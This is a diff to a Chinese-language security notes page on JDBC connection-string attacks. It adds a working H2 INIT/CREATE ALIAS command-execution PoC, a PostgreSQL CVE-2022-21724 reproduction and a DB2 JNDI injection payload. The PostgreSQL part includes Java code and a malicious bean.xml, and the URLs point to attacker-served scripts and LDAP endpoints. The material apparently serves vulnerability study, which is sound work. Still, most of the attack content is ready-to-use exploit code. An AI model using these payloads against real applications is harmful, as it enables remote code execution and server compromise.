@@ -193,7 +193,7 @@ MySQL JDBC 中包含一个危险的扩展参数： `autoDeserialize`。这个参
 
     mysql-connector-java 8.0.19 及以下
 
-    低版本利用区别详见参考资料
+    低版本利用区别详见参考资料《MYSQL JDBC反序列化解析》
 
 `ServerStatusDiffInterceptor`是一个拦截器，在JDBC URL中设置属性`queryInterceptors`(8.0以下为`statementInterceptors`)为`ServerStatusDiffInterceptor`时，执行查询语句会调用拦截器的 `preProcess` 和 `postProcess` 方法，进而调用 `getObject ()` 方法。
 
@@ -306,12 +306,6 @@ mysql-connector-java 8.0以上不再在`com.mysql.cj.jdbc.ConnectionImpl`中直�
 参考工具 [MySQL Fake Server](https://github.com/fnmsd/MySQL_Fake_Server){:target="_blank"}
 
 
-#### 参考资料
-
-- [小白看得懂的MySQL JDBC 反序列化漏洞分析](https://xz.aliyun.com/t/8159){:target="_blank"}
-- [MYSQL JDBC反序列化解析](https://tttang.com/archive/1877){:target="_blank"}
-- [Java JDBC](https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html){:target="_blank"}
-
 ### Other DB
 
 #### H2
@@ -322,7 +316,7 @@ H2 是一个用 Java 开发的嵌入式数据库，它本身只是一个类库�
 2. 用于单元测试。启动速度快，而且可以关闭持久化功能，每一个用例执行完随即还原到初始状态。
 3. 作为缓存，即当做内存数据库，作为NoSQL的一个补充。当某些场景下数据模型必须为关系型，可以拿它当Memcached使，作为后端MySQL/Oracle的一个缓冲层，缓存一些不经常变化但需要频繁访问的数据，比如字典表、权限表
 
-##### INIT RunScript RCE
+**INIT RunScript RCE**
 
 H2连接的时候可以通过设置INIT执行一段SQL脚本，从而实现RCE。
 
@@ -332,7 +326,7 @@ CREATE ALIAS EXEC AS 'String exec(String cmd) throws java.io.IOException {Runtim
 
 控制JDBC URL为`jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/rce.sql'`即可执行脚本，但该方法需要有正确的账户和密码登录。
 
-##### Alias Script RCE
+**Alias Script RCE**
 
 利用加载字节码实现不出网RCE，类似于SPEL以及OGNL注入内存马。
 
@@ -340,7 +334,12 @@ CREATE ALIAS EXEC AS 'String exec(String cmd) throws java.io.IOException {Runtim
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;CALL SHELLEXEC('whoami');
 ```
 
-##### TRIGGER Script RCE
+**PoC**
+``` 
+jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXECA AS 'String shellexec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd)\\;return \"hacker\"\\;}'\\;CALL EXECA('calc')
+```
+
+**TRIGGER Script RCE**
 
 除了ALIAS别名还可以用TRIGGER手写groovy或者js代码去RCE。
 
@@ -358,3 +357,92 @@ java.lang.Runtime.getRuntime().exec("calc") $$;
 
 TRIGGER不能在INIT处使用
 
+#### PostgreSQL
+
+在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞（CVE-2022-21724）。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 `authenticationPluginClassName`、`sslhostnameverifier`、`socketFactory` 、`sslfactory`、`sslpasswordcallback` 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。
+
+!!! tips "版本要求"
+
+    9.4.1208 <=PgJDBC <42.2.25
+
+　　42.3.0 <=PgJDBC < 42.3.2
+
+**漏洞复现**
+
+=== "pom.xml"
+
+    ```xml
+    <dependencies>
+        <!-- https://mvnrepository.com/artifact/org.postgresql/postgresql -->
+        <dependency>
+            <groupId>org.postgresql</groupId>
+            <artifactId>postgresql</artifactId>
+            <version>42.3.1</version>
+        </dependency>
+        <!-- https://mvnrepository.com/artifact/org.springframework/spring-context-support -->
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-context-support</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+    </dependencies>
+    ```
+
+=== "pgRCE.java"
+
+    ```java
+    import java.sql.Connection;
+    import java.sql.DriverManager;
+
+    public class pgRCE {
+        public static void main(String[] args) throws Exception{
+            String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
+            String socketFactoryArg = "http://127.0.0.1:7978/bean.xml";
+            String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
+            Connection connection = DriverManager.getConnection(jdbcUrl);
+        }
+    }
+    ```
+=== "bean.xml"
+
+    ```xml
+    <beans xmlns="http://www.springframework.org/schema/beans"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:p="http://www.springframework.org/schema/p"
+        xsi:schemaLocation="http://www.springframework.org/schema/beans
+            http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <!--    普通方式创建类-->
+    <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg>
+            <list>
+                <value>bash</value>
+                <value>-c</value>
+                <value>calc.exe</value>
+            </list>
+            </constructor-arg>
+        </bean>
+    </beans>
+    ```
+
+![alt text](img/postgrerce.png){loading=“lazy”}
+
+**漏洞分析**
+
+调用链如下
+![alt text](img/postgresql.png){loading=“lazy”}
+
+同时还存在任意文件写入漏洞，通过指定loggerLevel和loggerFile参数即可将jdbc://的URL内容写入指定文件
+![alt text](img/pgsqlfile.png)
+
+#### IBM DB2 JNDI注入
+
+payload:`jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1099/evil;`
+
+
+## 参考资料
+
+- [JDBC数据库汇总Attack研究](https://www.cnblogs.com/F12-blog/p/18144377){:target="_blank"}
+- [小白看得懂的MySQL JDBC 反序列化漏洞分析](https://xz.aliyun.com/t/8159){:target="_blank"}
+- [MYSQL JDBC反序列化解析](https://tttang.com/archive/1877){:target="_blank"}
+- [Java JDBC](https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html){:target="_blank"}
+- [PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)](https://xz.aliyun.com/t/11812?time__1311=Cq0xuD07wxRDlhzG7K6e4rfT4Y53x){:target="_blank"}
